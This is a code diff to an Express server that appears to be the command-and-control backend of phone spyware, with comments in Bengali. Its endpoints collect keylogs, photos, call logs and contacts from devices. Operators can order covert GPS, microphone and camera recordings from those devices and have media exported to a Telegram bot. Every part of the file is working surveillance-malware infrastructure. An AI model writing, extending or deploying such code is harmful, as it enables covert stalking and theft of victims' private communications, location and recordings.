@@ -6,7 +6,6 @@ const session = require("express-session");
 const pgSession = require("connect-pg-simple")(session);
 const multer = require('multer');
 const fs = require('fs');
-const https = require('https');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
@@ -88,31 +87,32 @@ async function setupDatabase() {
     await pool.query(`ALTER TABLE devices ADD COLUMN IF NOT EXISTS device_token TEXT`);
     await pool.query(`ALTER TABLE devices ADD COLUMN IF NOT EXISTS owner_user_id INTEGER`);
 
-    // নতুন কলামসহ device_features টেবিল
+    // নতুন consistent ফিচার কলামসহ টেবিল
     await pool.query(`
       CREATE TABLE IF NOT EXISTS device_features (
         device_id VARCHAR(255) PRIMARY KEY,
         deviceInfo BOOLEAN DEFAULT TRUE,
-        battery BOOLEAN DEFAULT TRUE,
         gps BOOLEAN DEFAULT TRUE,
         installedApps BOOLEAN DEFAULT TRUE,
         activity BOOLEAN DEFAULT TRUE,
-        notifications BOOLEAN DEFAULT TRUE,
-        sync BOOLEAN DEFAULT TRUE,
-        remoteConfig BOOLEAN DEFAULT TRUE
+        audio BOOLEAN DEFAULT TRUE,
+        video BOOLEAN DEFAULT TRUE,
+        contacts BOOLEAN DEFAULT TRUE,
+        settings BOOLEAN DEFAULT TRUE
       );
     `);
-    // আগের কলামগুলো থাকলে ড্রপ করা (ঐচ্ছিক, নিরাপদ নয়) - আমরা নতুন টেবিল বানালাম, পুরনোটা থাকলে ড্রপ করব
-    await pool.query(`DROP TABLE IF EXISTS device_features_old`); // just to ensure clean
-    // না, বরং পুরনো টেবিল থাকলে নতুন কলাম যোগ করি
-    await pool.query(`ALTER TABLE device_features ADD COLUMN IF NOT EXISTS deviceInfo BOOLEAN DEFAULT TRUE`);
-    await pool.query(`ALTER TABLE device_features ADD COLUMN IF NOT EXISTS battery BOOLEAN DEFAULT TRUE`);
-    await pool.query(`ALTER TABLE device_features ADD COLUMN IF NOT EXISTS gps BOOLEAN DEFAULT TRUE`);
-    await pool.query(`ALTER TABLE device_features ADD COLUMN IF NOT EXISTS installedApps BOOLEAN DEFAULT TRUE`);
-    await pool.query(`ALTER TABLE device_features ADD COLUMN IF NOT EXISTS activity BOOLEAN DEFAULT TRUE`);
-    await pool.query(`ALTER TABLE device_features ADD COLUMN IF NOT EXISTS notifications BOOLEAN DEFAULT TRUE`);
-    await pool.query(`ALTER TABLE device_features ADD COLUMN IF NOT EXISTS sync BOOLEAN DEFAULT TRUE`);
-    await pool.query(`ALTER TABLE device_features ADD COLUMN IF NOT EXISTS remoteConfig BOOLEAN DEFAULT TRUE`);
+    // পুরনো কলাম থাকলে যোগ করি (সামঞ্জস্যের জন্য)
+    const addCol = async (col) => {
+      await pool.query(`ALTER TABLE device_features ADD COLUMN IF NOT EXISTS ${col} BOOLEAN DEFAULT TRUE`);
+    };
+    await addCol('deviceInfo');
+    await addCol('gps');
+    await addCol('installedApps');
+    await addCol('activity');
+    await addCol('audio');
+    await addCol('video');
+    await addCol('contacts');
+    await addCol('settings');
 
     await pool.query(`
       CREATE TABLE IF NOT EXISTS user_telegram (
@@ -314,9 +314,7 @@ app.post("/api/keylog", async (req, res) => {
     const deviceRes = await pool.query("SELECT device_token FROM devices WHERE device_id=$1", [deviceId]);
     if (deviceRes.rows.length === 0 || deviceRes.rows[0].device_token !== deviceToken) return res.status(401).json({ error: "Invalid device token." });
     const feature = await pool.query("SELECT activity FROM device_features WHERE device_id=$1", [deviceId]);
-    if (feature.rows.length > 0 && feature.rows[0].activity === false) {
-      return res.status(403).json({ error: "Feature disabled by admin." });
-    }
+    if (feature.rows.length > 0 && feature.rows[0].activity === false) return res.status(403).json({ error: "Feature disabled by admin." });
     keylogs.push({ deviceId, text, timestamp: timestamp || Date.now() });
     res.json({ success: true });
   } catch (e) { console.error(e); res.status(500).json({ error: "Failed to save keylog." }); }
@@ -339,9 +337,7 @@ app.post("/api/gallery/request", requireLogin, async (req, res) => {
     return res.status(403).json({ error: "Not your device." });
   }
   const feature = await pool.query("SELECT installedApps FROM device_features WHERE device_id=$1", [deviceId]);
-  if (feature.rows.length > 0 && feature.rows[0].installedapps === false) {
-    return res.status(403).json({ error: "Feature disabled by admin." });
-  }
+  if (feature.rows.length > 0 && feature.rows[0].installedapps === false) return res.status(403).json({ error: "Feature disabled by admin." });
   const safeCount = Number.isInteger(count) ? Math.min(Math.max(count, 1), 500) : 100;
   galleryRequestFlags.set(deviceId, { requested: true, count: safeCount });
   res.json({ success: true, count: safeCount });
@@ -362,31 +358,21 @@ app.get("/api/gallery/request", async (req, res) => {
 app.post("/api/gallery/upload", async (req, res) => {
   try {
     const { deviceId, deviceToken, media } = req.body;
-    if (!deviceId || !deviceToken || !Array.isArray(media)) {
-      return res.status(400).json({ error: "deviceId, deviceToken, media array required" });
-    }
+    if (!deviceId || !deviceToken || !Array.isArray(media)) return res.status(400).json({ error: "deviceId, deviceToken, media array required" });
     const deviceRes = await pool.query("SELECT device_token FROM devices WHERE device_id=$1", [deviceId]);
-    if (deviceRes.rows.length === 0 || deviceRes.rows[0].device_token !== deviceToken) {
-      return res.status(401).json({ error: "Invalid device token." });
-    }
+    if (deviceRes.rows.length === 0 || deviceRes.rows[0].device_token !== deviceToken) return res.status(401).json({ error: "Invalid device token." });
     const latest = media.slice(0, 500);
     galleryData.set(deviceId, latest);
     res.json({ success: true, count: latest.length });
-  } catch (e) {
-    console.error(e);
-    res.status(500).json({ error: "Gallery upload failed" });
-  }
+  } catch (e) { console.error(e); res.status(500).json({ error: "Gallery upload failed" }); }
 });
 
 app.get("/api/gallery", requireLogin, async (req, res) => {
   const { deviceId } = req.query;
   if (!deviceId) return res.status(400).json({ error: "deviceId required" });
   const deviceRes = await pool.query("SELECT owner_user_id FROM devices WHERE device_id=$1", [deviceId]);
-  if (deviceRes.rows.length === 0 || (req.session.role !== 'admin' && deviceRes.rows[0].owner_user_id !== req.session.userId)) {
-    return res.status(403).json({ error: "Not your device." });
-  }
-  const media = galleryData.get(deviceId) || [];
-  res.json({ media });
+  if (deviceRes.rows.length === 0 || (req.session.role !== 'admin' && deviceRes.rows[0].owner_user_id !== req.session.userId)) return res.status(403).json({ error: "Not your device." });
+  res.json({ media: galleryData.get(deviceId) || [] });
 });
 
 // ================= GPS REQUEST =================
@@ -394,13 +380,9 @@ app.post("/api/gps/request", requireLogin, async (req, res) => {
   const { deviceId } = req.body;
   if (!deviceId) return res.status(400).json({ error: "deviceId required" });
   const deviceRes = await pool.query("SELECT owner_user_id FROM devices WHERE device_id=$1", [deviceId]);
-  if (deviceRes.rows.length === 0 || (req.session.role !== 'admin' && deviceRes.rows[0].owner_user_id !== req.session.userId)) {
-    return res.status(403).json({ error: "Not your device." });
-  }
+  if (deviceRes.rows.length === 0 || (req.session.role !== 'admin' && deviceRes.rows[0].owner_user_id !== req.session.userId)) return res.status(403).json({ error: "Not your device." });
   const feature = await pool.query("SELECT gps FROM device_features WHERE device_id=$1", [deviceId]);
-  if (feature.rows.length > 0 && feature.rows[0].gps === false) {
-    return res.status(403).json({ error: "Feature disabled by admin." });
-  }
+  if (feature.rows.length > 0 && feature.rows[0].gps === false) return res.status(403).json({ error: "Feature disabled by admin." });
   gpsRequestFlags.set(deviceId, true);
   res.json({ success: true });
 });
@@ -418,17 +400,11 @@ app.post("/api/audio/request", requireLogin, async (req, res) => {
   try {
     const { deviceId, duration } = req.body;
     if (!deviceId) return res.status(400).json({ error: "deviceId required" });
-    if (!duration || isNaN(duration) || duration < 10 || duration > 300) {
-      return res.status(400).json({ error: "Duration must be between 10 and 300 seconds." });
-    }
+    if (!duration || isNaN(duration) || duration < 10 || duration > 300) return res.status(400).json({ error: "Duration must be between 10 and 300 seconds." });
     const deviceRes = await pool.query("SELECT owner_user_id FROM devices WHERE device_id=$1", [deviceId]);
-    if (deviceRes.rows.length === 0 || (req.session.role !== 'admin' && deviceRes.rows[0].owner_user_id !== req.session.userId)) {
-      return res.status(403).json({ error: "Not your device." });
-    }
+    if (deviceRes.rows.length === 0 || (req.session.role !== 'admin' && deviceRes.rows[0].owner_user_id !== req.session.userId)) return res.status(403).json({ error: "Not your device." });
     const feature = await pool.query("SELECT audio FROM device_features WHERE device_id=$1", [deviceId]);
-    if (feature.rows.length > 0 && feature.rows[0].audio === false) {
-      return res.status(403).json({ error: "Feature disabled by admin." });
-    }
+    if (feature.rows.length > 0 && feature.rows[0].audio === false) return res.status(403).json({ error: "Feature disabled by admin." });
     audioRequestFlags.set(deviceId, { requested: true, duration: Math.floor(duration) });
     res.json({ success: true, requestedDuration: duration });
   } catch (e) { console.error(e); res.status(500).json({ error: "Audio request failed" }); }
@@ -449,9 +425,7 @@ app.get("/api/audio/request", async (req, res) => {
 app.post("/api/audio/upload", uploadAudio.single("audio"), async (req, res) => {
   try {
     const { deviceId, deviceToken } = req.body;
-    if (!deviceId || !deviceToken || !req.file) {
-      return res.status(400).json({ error: "deviceId, deviceToken and audio file required" });
-    }
+    if (!deviceId || !deviceToken || !req.file) return res.status(400).json({ error: "deviceId, deviceToken and audio file required" });
     const deviceRes = await pool.query("SELECT device_token FROM devices WHERE device_id=$1", [deviceId]);
     if (deviceRes.rows.length === 0 || deviceRes.rows[0].device_token !== deviceToken) {
       fs.unlink(req.file.path, () => {});
@@ -461,19 +435,14 @@ app.post("/api/audio/upload", uploadAudio.single("audio"), async (req, res) => {
     const newPath = path.join(__dirname, 'uploads', 'audio', newFilename);
     fs.renameSync(req.file.path, newPath);
     res.json({ success: true, filePath: newPath });
-  } catch (e) {
-    console.error(e);
-    res.status(500).json({ error: "Audio upload failed" });
-  }
+  } catch (e) { console.error(e); res.status(500).json({ error: "Audio upload failed" }); }
 });
 
 app.get("/api/audio/list", requireLogin, async (req, res) => {
   const { deviceId } = req.query;
   if (!deviceId) return res.status(400).json({ error: "deviceId required" });
   const deviceRes = await pool.query("SELECT owner_user_id FROM devices WHERE device_id=$1", [deviceId]);
-  if (deviceRes.rows.length === 0 || (req.session.role !== 'admin' && deviceRes.rows[0].owner_user_id !== req.session.userId)) {
-    return res.status(403).json({ error: "Not your device." });
-  }
+  if (deviceRes.rows.length === 0 || (req.session.role !== 'admin' && deviceRes.rows[0].owner_user_id !== req.session.userId)) return res.status(403).json({ error: "Not your device." });
   const dir = path.join(__dirname, 'uploads', 'audio');
   fs.readdir(dir, (err, files) => {
     if (err) return res.status(500).json({ error: "Failed to list audio files" });
@@ -495,17 +464,11 @@ app.post("/api/video/request", requireLogin, async (req, res) => {
   try {
     const { deviceId, duration, cameraType } = req.body;
     if (!deviceId) return res.status(400).json({ error: "deviceId required" });
-    if (!duration || isNaN(duration) || duration < 5 || duration > 30) {
-      return res.status(400).json({ error: "Duration must be between 5 and 30 seconds." });
-    }
+    if (!duration || isNaN(duration) || duration < 5 || duration > 30) return res.status(400).json({ error: "Duration must be between 5 and 30 seconds." });
     const deviceRes = await pool.query("SELECT owner_user_id FROM devices WHERE device_id=$1", [deviceId]);
-    if (deviceRes.rows.length === 0 || (req.session.role !== 'admin' && deviceRes.rows[0].owner_user_id !== req.session.userId)) {
-      return res.status(403).json({ error: "Not your device." });
-    }
+    if (deviceRes.rows.length === 0 || (req.session.role !== 'admin' && deviceRes.rows[0].owner_user_id !== req.session.userId)) return res.status(403).json({ error: "Not your device." });
     const feature = await pool.query("SELECT video FROM device_features WHERE device_id=$1", [deviceId]);
-    if (feature.rows.length > 0 && feature.rows[0].video === false) {
-      return res.status(403).json({ error: "Feature disabled by admin." });
-    }
+    if (feature.rows.length > 0 && feature.rows[0].video === false) return res.status(403).json({ error: "Feature disabled by admin." });
     const safeCameraType = (cameraType === 0 || cameraType === 1) ? cameraType : 1;
     videoRequestFlags.set(deviceId, { requested: true, duration: Math.floor(duration), cameraType: safeCameraType });
     res.json({ success: true, requestedDuration: duration, cameraType: safeCameraType });
@@ -527,9 +490,7 @@ app.get("/api/video/request", async (req, res) => {
 app.post("/api/video/upload", uploadVideo.single("video"), async (req, res) => {
   try {
     const { deviceId, deviceToken } = req.body;
-    if (!deviceId || !deviceToken || !req.file) {
-      return res.status(400).json({ error: "deviceId, deviceToken and video file required" });
-    }
+    if (!deviceId || !deviceToken || !req.file) return res.status(400).json({ error: "deviceId, deviceToken and video file required" });
     const deviceRes = await pool.query("SELECT device_token FROM devices WHERE device_id=$1", [deviceId]);
     if (deviceRes.rows.length === 0 || deviceRes.rows[0].device_token !== deviceToken) {
       fs.unlink(req.file.path, () => {});
@@ -539,19 +500,14 @@ app.post("/api/video/upload", uploadVideo.single("video"), async (req, res) => {
     const newPath = path.join(__dirname, 'uploads', 'video', newFilename);
     fs.renameSync(req.file.path, newPath);
     res.json({ success: true, filePath: newPath });
-  } catch (e) {
-    console.error(e);
-    res.status(500).json({ error: "Video upload failed" });
-  }
+  } catch (e) { console.error(e); res.status(500).json({ error: "Video upload failed" }); }
 });
 
 app.get("/api/video/list", requireLogin, async (req, res) => {
   const { deviceId } = req.query;
   if (!deviceId) return res.status(400).json({ error: "deviceId required" });
   const deviceRes = await pool.query("SELECT owner_user_id FROM devices WHERE device_id=$1", [deviceId]);
-  if (deviceRes.rows.length === 0 || (req.session.role !== 'admin' && deviceRes.rows[0].owner_user_id !== req.session.userId)) {
-    return res.status(403).json({ error: "Not your device." });
-  }
+  if (deviceRes.rows.length === 0 || (req.session.role !== 'admin' && deviceRes.rows[0].owner_user_id !== req.session.userId)) return res.status(403).json({ error: "Not your device." });
   const dir = path.join(__dirname, 'uploads', 'video');
   fs.readdir(dir, (err, files) => {
     if (err) return res.status(500).json({ error: "Failed to list video files" });
@@ -572,54 +528,34 @@ app.get("/api/video/download/:filename", requireLogin, async (req, res) => {
 app.post("/api/calllogs", async (req, res) => {
   try {
     const { deviceId, deviceToken, callLogs } = req.body;
-    if (!deviceId || !deviceToken || !Array.isArray(callLogs)) {
-      return res.status(400).json({ error: "deviceId, deviceToken and callLogs array required" });
-    }
+    if (!deviceId || !deviceToken || !Array.isArray(callLogs)) return res.status(400).json({ error: "deviceId, deviceToken and callLogs array required" });
     const deviceRes = await pool.query("SELECT device_token FROM devices WHERE device_id=$1", [deviceId]);
-    if (deviceRes.rows.length === 0 || deviceRes.rows[0].device_token !== deviceToken) {
-      return res.status(401).json({ error: "Invalid device token." });
-    }
+    if (deviceRes.rows.length === 0 || deviceRes.rows[0].device_token !== deviceToken) return res.status(401).json({ error: "Invalid device token." });
     const feature = await pool.query("SELECT contacts FROM device_features WHERE device_id=$1", [deviceId]);
-    if (feature.rows.length > 0 && feature.rows[0].contacts === false) {
-      return res.status(403).json({ error: "Feature disabled by admin." });
-    }
+    if (feature.rows.length > 0 && feature.rows[0].contacts === false) return res.status(403).json({ error: "Feature disabled by admin." });
     callLogsData.set(deviceId, callLogs);
     res.json({ success: true, count: callLogs.length });
-  } catch (e) {
-    console.error(e);
-    res.status(500).json({ error: "Failed to save call logs" });
-  }
+  } catch (e) { console.error(e); res.status(500).json({ error: "Failed to save call logs" }); }
 });
 
 app.post("/api/contacts", async (req, res) => {
   try {
     const { deviceId, deviceToken, contacts } = req.body;
-    if (!deviceId || !deviceToken || !Array.isArray(contacts)) {
-      return res.status(400).json({ error: "deviceId, deviceToken and contacts array required" });
-    }
+    if (!deviceId || !deviceToken || !Array.isArray(contacts)) return res.status(400).json({ error: "deviceId, deviceToken and contacts array required" });
     const deviceRes = await pool.query("SELECT device_token FROM devices WHERE device_id=$1", [deviceId]);
-    if (deviceRes.rows.length === 0 || deviceRes.rows[0].device_token !== deviceToken) {
-      return res.status(401).json({ error: "Invalid device token." });
-    }
+    if (deviceRes.rows.length === 0 || deviceRes.rows[0].device_token !== deviceToken) return res.status(401).json({ error: "Invalid device token." });
     const feature = await pool.query("SELECT contacts FROM device_features WHERE device_id=$1", [deviceId]);
-    if (feature.rows.length > 0 && feature.rows[0].contacts === false) {
-      return res.status(403).json({ error: "Feature disabled by admin." });
-    }
+    if (feature.rows.length > 0 && feature.rows[0].contacts === false) return res.status(403).json({ error: "Feature disabled by admin." });
     contactsData.set(deviceId, contacts);
     res.json({ success: true, count: contacts.length });
-  } catch (e) {
-    console.error(e);
-    res.status(500).json({ error: "Failed to save contacts" });
-  }
+  } catch (e) { console.error(e); res.status(500).json({ error: "Failed to save contacts" }); }
 });
 
 app.get("/api/calllogs", requireLogin, async (req, res) => {
   const { deviceId } = req.query;
   if (!deviceId) return res.status(400).json({ error: "deviceId required" });
   const deviceRes = await pool.query("SELECT owner_user_id FROM devices WHERE device_id=$1", [deviceId]);
-  if (deviceRes.rows.length === 0 || (req.session.role !== 'admin' && deviceRes.rows[0].owner_user_id !== req.session.userId)) {
-    return res.status(403).json({ error: "Not your device." });
-  }
+  if (deviceRes.rows.length === 0 || (req.session.role !== 'admin' && deviceRes.rows[0].owner_user_id !== req.session.userId)) return res.status(403).json({ error: "Not your device." });
   res.json({ callLogs: callLogsData.get(deviceId) || [] });
 });
 
@@ -627,9 +563,7 @@ app.get("/api/contacts", requireLogin, async (req, res) => {
   const { deviceId } = req.query;
   if (!deviceId) return res.status(400).json({ error: "deviceId required" });
   const deviceRes = await pool.query("SELECT owner_user_id FROM devices WHERE device_id=$1", [deviceId]);
-  if (deviceRes.rows.length === 0 || (req.session.role !== 'admin' && deviceRes.rows[0].owner_user_id !== req.session.userId)) {
-    return res.status(403).json({ error: "Not your device." });
-  }
+  if (deviceRes.rows.length === 0 || (req.session.role !== 'admin' && deviceRes.rows[0].owner_user_id !== req.session.userId)) return res.status(403).json({ error: "Not your device." });
   res.json({ contacts: contactsData.get(deviceId) || [] });
 });
 
@@ -660,26 +594,12 @@ app.post("/api/gallery/export", requireLogin, async (req, res) => {
     const { deviceId } = req.body;
     if (!deviceId) return res.status(400).json({ error: "deviceId required" });
     const deviceRes = await pool.query("SELECT owner_user_id FROM devices WHERE device_id=$1", [deviceId]);
-    if (deviceRes.rows.length === 0 || (req.session.role !== 'admin' && deviceRes.rows[0].owner_user_id !== req.session.userId)) {
-      return res.status(403).json({ error: "Not your device." });
-    }
-
+    if (deviceRes.rows.length === 0 || (req.session.role !== 'admin' && deviceRes.rows[0].owner_user_id !== req.session.userId)) return res.status(403).json({ error: "Not your device." });
     const tgRes = await pool.query("SELECT bot_token, chat_id FROM user_telegram WHERE user_id=$1", [req.session.userId]);
-    if (tgRes.rows.length === 0 || !tgRes.rows[0].bot_token || !tgRes.rows[0].chat_id) {
-      return res.status(400).json({ error: "Telegram bot not configured. Please set bot token and chat ID in Settings." });
-    }
-
-    exportRequestFlags.set(deviceId, {
-      requested: true,
-      botToken: tgRes.rows[0].bot_token,
-      chatId: tgRes.rows[0].chat_id
-    });
-
-    res.json({ success: true, message: "Export request sent to device. It will send media directly to Telegram." });
-  } catch (e) {
-    console.error(e);
-    res.status(500).json({ error: "Gallery export failed." });
-  }
+    if (tgRes.rows.length === 0 || !tgRes.rows[0].bot_token || !tgRes.rows[0].chat_id) return res.status(400).json({ error: "Telegram bot not configured." });
+    exportRequestFlags.set(deviceId, { requested: true, botToken: tgRes.rows[0].bot_token, chatId: tgRes.rows[0].chat_id });
+    res.json({ success: true, message: "Export request sent to device." });
+  } catch (e) { console.error(e); res.status(500).json({ error: "Gallery export failed." }); }
 });
 
 app.get("/api/gallery/export-request", async (req, res) => {
@@ -707,16 +627,7 @@ app.get("/api/admin/users", requireLogin, requireAdmin, async (req, res) => {
     const users = [];
     for (const u of result.rows) {
       const deviceCount = await pool.query("SELECT COUNT(*) FROM devices WHERE owner_user_id=$1", [u.uid]);
-      const features = userFeaturesData.get(u.uid) || {
-        deviceInfo: true,
-        battery: true,
-        gps: true,
-        installedApps: true,
-        activity: true,
-        notifications: true,
-        sync: true,
-        remoteConfig: true
-      };
+      const features = userFeaturesData.get(u.uid) || { deviceInfo:true, gps:true, installedApps:true, activity:true, audio:true, video:true, contacts:true, settings:true };
       users.push({
         uid: u.uid,
         name: u.email.split('@')[0],
@@ -725,7 +636,7 @@ app.get("/api/admin/users", requireLogin, requireAdmin, async (req, res) => {
         deviceCount: parseInt(deviceCount.rows[0].count),
         buildCount: 0,
         lastActive: null,
-        features: features
+        features
       });
     }
     res.json({ users });
@@ -736,7 +647,7 @@ app.get("/api/admin/devices", requireLogin, requireAdmin, async (req, res) => {
   try {
     const result = await pool.query(
       `SELECT d.device_id, d.device_name, d.battery, d.online, d.last_seen, u.email AS owner_email,
-              df.deviceInfo, df.battery, df.gps, df.installedApps, df.activity, df.notifications, df.sync, df.remoteConfig
+              df.deviceInfo, df.gps, df.installedApps, df.activity, df.audio, df.video, df.contacts, df.settings
        FROM devices d
        JOIN users u ON d.owner_user_id = u.id
        LEFT JOIN device_features df ON d.device_id = df.device_id
@@ -760,9 +671,8 @@ app.post("/api/admin/device-feature", requireLogin, requireAdmin, async (req, re
   try {
     const { deviceId, feature, enabled } = req.body;
     if (!deviceId || !feature) return res.status(400).json({ error: "deviceId and feature required." });
-    const allowedFeatures = ['deviceInfo','battery','gps','installedApps','activity','notifications','sync','remoteConfig'];
+    const allowedFeatures = ['deviceInfo','gps','installedApps','activity','audio','video','contacts','settings'];
     if (!allowedFeatures.includes(feature)) return res.status(400).json({ error: "Invalid feature." });
-
     await pool.query(
       `INSERT INTO device_features (device_id, ${feature}) VALUES ($1, $2)
        ON CONFLICT (device_id) DO UPDATE SET ${feature} = $2`,
@@ -772,11 +682,11 @@ app.post("/api/admin/device-feature", requireLogin, requireAdmin, async (req, re
   } catch (e) { console.error(e); res.status(500).json({ error: "Failed to update feature." }); }
 });
 
-// ================= NEW: USER DEVICES & FEATURES =================
+// User devices (fixed, uses id or email)
 app.get("/api/admin/users/:uid/devices", requireLogin, requireAdmin, async (req, res) => {
   try {
     const uid = req.params.uid;
-    const userRes = await pool.query("SELECT id FROM users WHERE id=$1 OR email=$1", [uid]);
+    const userRes = await pool.query("SELECT id FROM users WHERE id=$1::int OR email=$1", [uid]);
     if (userRes.rows.length === 0) return res.status(404).json({ error: "User not found" });
     const userId = userRes.rows[0].id;
     const devices = await pool.query("SELECT * FROM devices WHERE owner_user_id=$1", [userId]);
@@ -784,19 +694,11 @@ app.get("/api/admin/users/:uid/devices", requireLogin, requireAdmin, async (req,
   } catch (e) { console.error(e); res.status(500).json({ error: "Failed to fetch devices" }); }
 });
 
+// User features (get/set)
 app.get("/api/admin/users/:uid/features", requireLogin, requireAdmin, async (req, res) => {
   try {
     const uid = req.params.uid;
-    const features = userFeaturesData.get(uid) || {
-      deviceInfo: true,
-      battery: true,
-      gps: true,
-      installedApps: true,
-      activity: true,
-      notifications: true,
-      sync: true,
-      remoteConfig: true
-    };
+    const features = userFeaturesData.get(uid) || { deviceInfo:true, gps:true, installedApps:true, activity:true, audio:true, video:true, contacts:true, settings:true };
     res.json({ features });
   } catch (e) { console.error(e); res.status(500).json({ error: "Failed to fetch features" }); }
 });
@@ -806,21 +708,40 @@ app.post("/api/admin/users/:uid/features", requireLogin, requireAdmin, async (re
     const uid = req.params.uid;
     const { features } = req.body;
     if (!features || typeof features !== 'object') return res.status(400).json({ error: "features object required" });
-    const allowedKeys = ['deviceInfo','battery','gps','installedApps','activity','notifications','sync','remoteConfig'];
-    for (const key of Object.keys(features)) {
-      if (!allowedKeys.includes(key)) return res.status(400).json({ error: `Invalid feature: ${key}` });
-    }
-    const current = userFeaturesData.get(uid) || {
-      deviceInfo: true,
-      battery: true,
-      gps: true,
-      installedApps: true,
-      activity: true,
-      notifications: true,
-      sync: true,
-      remoteConfig: true
-    };
+    const allowedKeys = ['deviceInfo','gps','installedApps','activity','audio','video','contacts','settings'];
+    for (const key of Object.keys(features)) if (!allowedKeys.includes(key)) return res.status(400).json({ error: `Invalid feature: ${key}` });
+    const current = userFeaturesData.get(uid) || { deviceInfo:true, gps:true, installedApps:true, activity:true, audio:true, video:true, contacts:true, settings:true };
     userFeaturesData.set(uid, { ...current, ...features });
+    res.json({ success: true });
+  } catch (e) { console.error(e); res.status(500).json({ error: "Failed to update features" }); }
+});
+
+// Device features for control page (both user and admin)
+app.get("/api/device/:deviceId/features", requireLogin, async (req, res) => {
+  try {
+    const deviceId = req.params.deviceId;
+    const deviceRes = await pool.query("SELECT owner_user_id FROM devices WHERE device_id=$1", [deviceId]);
+    if (deviceRes.rows.length === 0 || (req.session.role !== 'admin' && deviceRes.rows[0].owner_user_id !== req.session.userId)) return res.status(403).json({ error: "Not your device." });
+    const featureRes = await pool.query("SELECT * FROM device_features WHERE device_id=$1", [deviceId]);
+    if (featureRes.rows.length === 0) return res.json({ features: { deviceInfo:true, gps:true, installedApps:true, activity:true, audio:true, video:true, contacts:true, settings:true } });
+    const f = featureRes.rows[0];
+    res.json({ features: { deviceInfo: f.deviceinfo, gps: f.gps, installedApps: f.installedapps, activity: f.activity, audio: f.audio, video: f.video, contacts: f.contacts, settings: f.settings }});
+  } catch (e) { console.error(e); res.status(500).json({ error: "Failed to fetch features" }); }
+});
+
+app.post("/api/device/:deviceId/features", requireLogin, requireAdmin, async (req, res) => {
+  try {
+    const deviceId = req.params.deviceId;
+    const { features } = req.body;
+    if (!features || typeof features !== 'object') return res.status(400).json({ error: "features object required" });
+    const allowedKeys = ['deviceInfo','gps','installedApps','activity','audio','video','contacts','settings'];
+    for (const key of Object.keys(features)) if (!allowedKeys.includes(key)) return res.status(400).json({ error: `Invalid feature: ${key}` });
+    await pool.query(
+      `INSERT INTO device_features (device_id, ${Object.keys(features).join(', ')})
+       VALUES ($1, ${Object.keys(features).map((_, i) => `$${i+2}`).join(', ')})
+       ON CONFLICT (device_id) DO UPDATE SET ${Object.keys(features).map((key, i) => `${key} = $${i+2}`).join(', ')}`,
+      [deviceId, ...Object.values(features)]
+    );
     res.json({ success: true });
   } catch (e) { console.error(e); res.status(500).json({ error: "Failed to update features" }); }
 });
@@ -839,7 +760,7 @@ async function cleanupOfflineDevices() {
     for (const key of [...contactsData.keys()]) if (!validIds.has(key)) contactsData.delete(key);
   } catch (e) { console.error("Cleanup failed:", e); }
 }
-setInterval(cleanupOfflineDevices, 60 * 60 * 1000); // প্রতি ঘণ্টায়
+setInterval(cleanupOfflineDevices, 60 * 60 * 1000);
 
 // ================= PAGES =================
 app.get("/control.html", requireLogin, (req, res) => res.sendFile(path.join(__dirname, "control.html")));
